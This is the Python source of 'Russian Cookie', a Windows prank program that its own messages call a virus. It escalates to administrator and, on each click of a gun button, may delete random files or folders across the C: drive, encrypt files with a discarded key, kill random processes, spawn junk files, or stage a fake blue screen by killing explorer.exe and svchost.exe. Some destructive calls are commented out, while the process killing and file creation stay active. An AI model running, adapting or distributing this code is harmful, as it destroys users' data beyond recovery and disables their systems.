import os, ctypes, sys, random, glob, shutil, string, webbrowser, simpleaudio, pyautogui, psutil, signal, json
from cryptography.fernet import Fernet
from tkinter import *
    

if ctypes.windll.shell32.IsUserAnAdmin():
    
    def rndFile(folder=False, file=False):
        
        percent_to_continue = 0
        # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
        path = "C:"
        
        while True:
            
            try: path = random.choice(glob.glob(f"{path}/*"))
            except:
                percent_to_continue = 0
                # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
                path = "C:"
                continue
            
            if os.path.isdir(path):
                
                if len(path) == 0:
                    percent_to_continue = 0
                    # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
                    path = "C:"
                    continue
                
                if random.random() < percent_to_continue: 
                    try: 
                        path = path.replace("\\", "/")
                        if folder: return path
                        else: 0 / 0
                    except:
                        percent_to_continue = 0
                        # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
                        path = "C:"
                        continue
                
                percent_to_continue += 0.1
                
            else:
                try: 
                    path = path.replace("\\", "/")
                    if file: return path
                    else: 0 / 0
                except:
                    percent_to_continue = 0
                    # path = random.choice(psutil.disk_partitions())[0].replace("\\", "")
                    path = "C:"
                    continue
        
    def delAll(path):
        
        while True:
        
            try:
            
                if not "Russian" in path:
                
                    if os.path.isdir(path):
                        shutil.rmtree(path)
                        path = path.replace('/', '\\')
                        return f"Folder deleted : {path}"
                    else: 
                        os.remove(path)
                        path = path.replace('/', '\\')
                        return f"File deleted : {path}"
                    
                else: return "The virus prevented self-deletion."
                
            except: path = rndFile(folder=True, file=True)
                    
    def cptFile(path):
        
        while True:
        
            try:
                
                if not "Russian" in path:
            
                    fernet = Fernet(Fernet.generate_key())
                    with open(path, 'rb') as f: original = f.read()
                    with open(path, 'wb') as encrypted_file: encrypted_file.write(fernet.encrypt(original))
                    
                    path = path.replace('/', '\\')
                    return f"File crypted : {path}"
                
                else: return "Virus prevented from self-encrypting."    
                
            except: path = rndFile(file=True)
    
    def kilProcess():
        
        while True:
            
            try:       
                process_dict = {}
    
                for p in psutil.process_iter(): process_dict[p.pid] = p.name()
                
                k = random.choice(list(process_dict.keys()))
                
                if process_dict[k] not in ["svchost.exe", "gui.exe"]:
                    os.kill(k, signal.SIGBREAK)  
                    return f"process stopped : {process_dict[k]}"
                    
            except: continue
          
    def strFile(path):
        
        while True:
        
            try: 
                os.startfile(path)
                
                path = path.replace('/', '\\')
                return f"File started : {path}"
            
            except: path = rndFile(file=True)
            
    def addFile(path):
        
        while True:
        
            try:
            
                name = ""
                for i in range(random.randint(1, 10)): name += random.choice(string.printable)
                    
                ext = ""
                for i in range(2, 5): ext += random.choice(string.printable)
                    
                with open(f"{path}/{name}.{ext}", "w+") as f: f.write(f"{str(name) * 100}\n")
                
                path = path.replace('/', '\\')
                return f"File {name}.{ext} created at {path}"
                
            except: path = rndFile(folder=True)
                
    def Bsod():
        window.destroy()
        os.system("taskkill /f /im explorer.exe")
        pyautogui.hotkey("win", "d")
        os.startfile("fatma.vbs")
        simpleaudio.WaveObject.from_wave_file("BSOD.wav").play().wait_done()
        os.system("taskkill /f /im svchost.exe")
        
    def Center(win):
        win.update_idletasks()
        width = win.winfo_width()
        frm_width = win.winfo_rootx() - win.winfo_x()
        win_width = width + 2 * frm_width
        height = win.winfo_height()
        titlebar_height = win.winfo_rooty() - win.winfo_y()
        win_height = height + titlebar_height + frm_width
        x = win.winfo_screenwidth() // 2 - win_width // 2
        y = win.winfo_screenheight() // 2 - win_height // 2
        win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
        win.deiconify()

    ##########
    # IN DEV #
    ##########

    def SettingsSaveWrite():
        
        global settings, save_settings
        
        print(save_settings)
        
        for k, b in save_settings.items(): settings["save_settings"][k] = b.get()
            
        with open("settings.json", "w") as j:
            json.dump(settings, j, indent=4)
            
        with open("settings.json", "r") as j:
            settings = json.load(j)
            save_settings = settings["save_settings"]
        
        for k, b in save_settings.items(): 
            ex = BooleanVar()
            ex.set(b)
            save_settings[k] = ex
            
        print(save_settings)

    ##########
    # IN DEV #
    ##########

    def onClick():
        
        global text_action, gun_button, color
        
        while True:
        
            rda = round(random.random(), 2)
            
            if not 0.01 < rda <= 0.2 and save_settings["Sounds"].get():
                gun_button.configure(image=gunshot)
                shot_audio.play()
                window.after(100, lambda: gun_button.configure(image=gun))
            
            if 0 <= rda <= 0.01 and save_settings["Bsod"].get(): Bsod()
            elif 0.01 < rda <= 0.2 and save_settings["Nothing"].get():
                text_action = "You haven't had anything ... So far!"
                color = "#cfcfb8"
                break
            elif 0.2 < rda <= 0.4 and save_settings["Deleting"].get():
                # text_action = delAll(rndFile(folder=True, file=True))
                color = "#E20808"
                break
            elif 0.4 < rda <= 0.5 and save_settings["Encrypting"].get():
                # text_action = cptFile(rndFile(file=True))
                color = "#E208B4"
                break
            elif 0.5 < rda <= 0.7 and save_settings["Starting"].get():
                # text_action = strFile(rndFile(file=True))
                color = "#42BF20"
                break
            elif 0.7 < rda <= 0.8 and save_settings["Creating"].get():
                text_action = addFile(rndFile(folder=True))
                color = "#0843E2"
                break
            elif 0.8 < rda <= 1 and save_settings["Taskkill"].get():
                text_action = kilProcess()
                color = "#DA5914"
                break
            else:
                c = True
                for v in save_settings.values():
                    print(v.get())
                    if v.get():
                        c = False
                if c:
                    text_action = "You must activate at least one event in the settings !"
                    color = "#E20808"
                    break
            

    window = Tk()
    window.title("Russian Cookie")
    window.iconbitmap("logo.ico")
    ww = round(window.winfo_screenwidth() / 1.28)
    wh = round(window.winfo_screenheight() / 1.5)
    window.configure(background='black')
    window.geometry(f"{ww}x{wh}")
    window.maxsize(ww, wh)
    window.minsize(ww, wh)

    mcw = round(ww / 1.3636363636363636363636363636364)
    mch = round(wh / 1)
    lcw = round(ww / 3.75)
    list_canvas = Canvas(window, width=lcw, height=mch, highlightthickness=0, bg='#292926')
    main_canvas = Canvas(window, width=mcw, height=mch, highlightthickness=0, bg='#4e4e47')
    
    ##################
    # CONTINUER ICI #
    #################
    
    with open("settings.json", "r") as j:
        settings = json.load(j)
        save_settings = settings["save_settings"]
    
    for k, b in save_settings.items(): 
        ex = BooleanVar()
        ex.set(b)
        save_settings[k] = ex
    
    menu = Menu(window, tearoff=0)
    window.config(menu=menu)
    options_menu = Menu(menu, tearoff=0, bg='#292926', fg="white")
    others_menu = Menu(menu, tearoff=0, bg='#292926', fg="white")
    
    menu.add_cascade(label="Options", menu=options_menu)
    menu.add_cascade(label="Others", menu=others_menu)
    
    options_menu.add_command(label="Percentages", command=lambda: print("Pourcentage"))
    others_menu.add_command(label="About...", command=lambda: webbrowser.open_new("https://github.com/BOuletteRusSe/RussianCookie"))
    
    options_menu.add_checkbutton(label="Sounds", onvalue=True, offvalue=False, variable=save_settings["Sounds"], selectcolor="red")
    options_menu.add_checkbutton(label="Deleting", onvalue=True, offvalue=False, variable=save_settings["Deleting"], selectcolor="red")
    options_menu.add_checkbutton(label="Encrypting", onvalue=True, offvalue=False, variable=save_settings["Encrypting"], selectcolor="red")
    options_menu.add_checkbutton(label="Starting", onvalue=True, offvalue=False, variable=save_settings["Starting"], selectcolor="red")
    options_menu.add_checkbutton(label="Creating", onvalue=True, offvalue=False, variable=save_settings["Creating"], selectcolor="red")
    options_menu.add_checkbutton(label="Taskkill", onvalue=True, offvalue=False, variable=save_settings["Taskkill"], selectcolor="red")
    options_menu.add_checkbutton(label="BSOD", onvalue=True, offvalue=False, variable=save_settings["Bsod"], selectcolor="red")
    options_menu.add_checkbutton(label="Nothing", onvalue=True, offvalue=False, variable=save_settings["Nothing"], selectcolor="red")
    
    ##################
    # CONTINUER ICI #
    #################

    shot_audio = simpleaudio.WaveObject.from_wave_file("shot.wav")
    gun = PhotoImage(file="gun.png")
    gunshot = PhotoImage(file="gunshot.png")
    gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0)
    main_canvas.create_window(round(mcw / 2), 375, window=gun_button)

    h = 0
    le = round((ww * wh) / 72000)
    ps = round((ww * wh) / 108000)
    linejmp = round((ww * wh) / 20000)
    texts = []
    text_action = None
    color = "black"

    main_canvas.place(x=0, y=0)
    list_canvas.place(x=mcw, y=0)
        
        
    while True:
        
        try:
        
            if text_action is not None:
                h += le
                if h >= mch:
                    list_canvas.delete("all")
                    window.update()
                    h = le
                if len(text_action) > linejmp: 
                    list_canvas.create_text(0, h, text=f">  {text_action[:linejmp]}", font=('Consolas', ps), fill=color, anchor="w")
                    h += le
                    list_canvas.create_text(0, h, text=f"   {text_action[linejmp:]}", font=('Consolas', ps), fill=color, anchor="w")
                else: list_canvas.create_text(0, h, text=f">  {text_action}", font=('Consolas', ps), fill=color, anchor="w")
                text_action = None
            window.update()
            
        except: break

else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)